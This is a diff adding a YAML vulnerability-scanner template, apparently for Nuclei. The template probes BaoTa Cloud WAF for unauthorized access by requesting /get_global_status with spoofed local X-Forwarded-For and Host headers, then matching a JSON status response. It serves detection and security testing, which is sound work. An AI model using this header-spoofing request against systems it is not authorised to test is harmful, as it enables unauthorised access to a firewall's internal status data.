@@ -1,0 +1,32 @@
+id: poc-yaml-bt-waf-unauthorized-access
+info:
+  name: BaoTa Cloud WAF Unauthorized Access Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: unauthorized-access
+  description: |
+    This template detects unauthorized access vulnerabilities in BaoTa Cloud WAF by accessing the /get_global_status endpoint.
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/get_global_status"
+    headers:
+      X-Forwarded-For: "127.0.0.1"
+      Host: "127.0.0.251"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: header
+        words:
+          - "application/json"
+      - type: word
+        words:
+          - "waiting"
+          - "recv_bytes"
+          - "proxy_count"
+          - "spider_google"
+        part: body
